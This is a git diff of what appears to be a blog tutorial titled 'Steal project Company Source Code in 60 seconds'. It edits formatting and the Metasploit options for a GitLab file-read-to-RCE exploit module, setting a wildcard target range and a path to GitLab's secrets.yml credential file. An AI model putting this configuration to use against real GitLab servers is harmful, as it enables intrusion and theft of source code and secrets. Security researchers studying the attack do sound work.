@@ -4,7 +4,9 @@ layout: default
 
 ### Steal project Company Source Code in 60 seconds
 
-![title](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/title.jpg)[1]
+----------
+
+![title](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/title.jpg)
 
 ----------
 
@@ -46,7 +48,7 @@ Module options (exploit/multi/http/gitlab_file_read_rce):
    ----             ---------------                                               
    USERNAME         oleksii@test.test                                             
    PASSWORD         oleksii@test.test                                             
-   RHOSTS           10.10.10.                                                         
+   RHOSTS           10.10.10.*                                                         
    RPORT            443                                                           
    SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  
    TARGETURI        /users/sign_in                                                
